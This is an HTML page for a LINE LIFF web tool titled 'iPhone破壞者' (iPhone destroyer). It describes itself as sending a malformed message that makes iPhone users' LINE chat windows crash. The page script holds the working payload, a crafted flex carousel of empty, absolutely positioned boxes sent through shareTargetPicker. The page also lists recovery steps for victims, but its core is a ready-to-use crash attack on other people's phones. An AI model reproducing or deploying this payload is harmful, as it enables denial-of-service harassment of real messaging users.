<html lang="en">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Primary Meta Tags -->
    <title>iPhone破壞者</title>
    <meta name="title" content="iPhone破壞者" />
    <meta
      name="description"
      content="這個小工具會發送問題訊息給 iPhone 使用者讓他該聊天視窗閃退"
    />

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website" />
    <meta
      property="og:url"
      content="https://liff.line.me/1656959396-Nr7egvd5/"
    />
    <meta property="og:title" content="iPhone破壞者" />
    <meta
      property="og:description"
      content="這個小工具會發送問題訊息給 iPhone 使用者讓他該聊天視窗閃退"
    />
    <meta
      property="og:image"
      content="https://freepngimg.com/download/temp_icon/12-2-anime-download-png_64x64.ico"
    />

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image" />
    <meta
      property="twitter:url"
      content="https://liff.line.me/1656959396-Nr7egvd5/"
    />
    <meta property="twitter:title" content="iPhone破壞者" />
    <meta
      property="twitter:description"
      content="這個小工具會發送問題訊息給 iPhone 使用者讓他該聊天視窗閃退"
    />
    <meta
      property="twitter:image"
      content="https://freepngimg.com/download/temp_icon/12-2-anime-download-png_64x64.ico"
    />
    <meta name="keywords" content="liff, line, line閃退, iphone line閃退" />
    <meta name="robots" content="index, follow" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="language" content="English" />
    <meta name="author" content="hanshino@github.com" />
    <title>iPhone破壊者</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
      crossorigin="anonymous"
    />
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
      crossorigin="anonymous"
    ></script>
    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <div class="container-fluid">
        <a class="navbar-brand" href="#">壞壞小工具</a>
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarSupportedContent"
          aria-controls="navbarSupportedContent"
          aria-expanded="false"
          aria-label="Toggle navigation"
        >
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
          <ul class="navbar-nav me-auto mb-2 mb-lg-0">
            <li class="nav-item">
              <a class="nav-link active" aria-current="page" href="#">首頁</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
    <div class="container">
      <div class="row">
        <div class="col-12 my-2">
          <div class="alert alert-warning" role="alert">
            <h4 class="alert-heading">注意！</h4>
            <p>使用後會造成 iPhone 使用者的聊天室閃退</p>
            <hr />
            <p>解決方法：</p>
            <ul>
              <li>使用電腦版將有問題的訊息洗至頂端</li>
              <li>請對方使用貼圖將有問題的訊息刷至頂端</li>
              <li>刪除該聊天紀錄</li>
            </ul>
          </div>
        </div>
        <div class="col-12">
          <div class="alert alert-info">
            此工具原理為利用
            <a href="https://line.me/zh-hant/">LINE</a>
            的功能，<mark>shareTargetPicker</mark>將有問題的訊息分享給對方，因此需要登入
            LINE 以取得權限
            <p>
              如對此有疑慮可以直接在LINE中開啟此網站，LINE會自動授權，將不會有需要登入的步驟！
            </p>
          </div>
        </div>
        <div class="col-12 my-3">
          <button type="button" class="btn btn-primary w-100" id="btnSend">
            發送訊息
          </button>
        </div>
        <div class="col-12 my-3">
          <button type="button" class="btn btn-success w-100" id="auth">
            登入LINE
          </button>
        </div>
      </div>
    </div>
  </body>
  <script>
    $(document).ready(init);

    async function init() {
      await liff.init({
        liffId: "1656959396-Nr7egvd5",
      });

      let isLoggedIn = liff.isLoggedIn();
      $("#auth").attr("data-action", isLoggedIn ? "logout" : "login");
      $("#auth").text(isLoggedIn ? "登出" : "登入 LINE");
    }

    $(document)
      .on("click", "#auth[data-action='login']", function () {
        liff.login();
      })
      .on("click", "#auth[data-action='logout']", function () {
        liff.logout();
        location.href = "/";
      })
      .on("click", "#btnSend", function () {
        if (!liff.isLoggedIn()) {
          alert("請先登入LINE");
          return;
        }
        liff.shareTargetPicker([
          {
            type: "flex",
            altText: "test",
            contents: {
              type: "carousel",
              contents: [
                {
                  type: "bubble",
                  body: {
                    type: "box",
                    layout: "vertical",
                    contents: [
                      {
                        type: "image",
                        url: "https://i.imgur.com/FD0TWBR.png",
                        aspectMode: "cover",
                        size: "full",
                        aspectRatio: "15:9",
                      },
                      {
                        type: "box",
                        layout: "vertical",
                        contents: [],
                        borderWidth: "none",
                        width: "30%",
                        position: "absolute",
                        offsetEnd: "10%",
                        offsetTop: "15%",
                        cornerRadius: "100px",
                        paddingAll: "none",
                      },
                      {
                        type: "box",
                        layout: "vertical",
                        contents: [],
                        position: "absolute",
                        offsetStart: "7%",
                        offsetTop: "15%",
                        paddingAll: "md",
                      },
                      {
                        type: "box",
                        layout: "vertical",
                        contents: [
                          {
                            type: "box",
                            layout: "vertical",
                            contents: [],
                            height: "8px",
                            backgroundColor: "#56DE58",
                            width: "45.83333333333333%",
                          },
                        ],
                        backgroundColor: "#9FD8E3CF",
                      },
                    ],
                    paddingAll: "none",
                  },
                },
                {
                  type: "bubble",
                  body: {
                    type: "box",
                    layout: "vertical",
                    contents: [
                      {
                        type: "image",
                        url: "https://i.imgur.com/auQjn3v.jpg",
                        size: "full",
                        aspectRatio: "15:9",
                        aspectMode: "cover",
                      },
                      {
                        type: "box",
                        layout: "vertical",
                        contents: [
                          {
                            type: "separator",
                            color: "#808080",
                          },
                        ],
                        paddingAll: "sm",
                        spacing: "xs",
                        position: "absolute",
                        offsetTop: "15%",
                        offsetStart: "5%",
                        width: "90%",
                        backgroundColor: "#80808044",
                        cornerRadius: "md",
                      },
                    ],
                    paddingAll: "none",
                  },
                },
              ],
            },
          },
        ]);
      });
  </script>
</html>
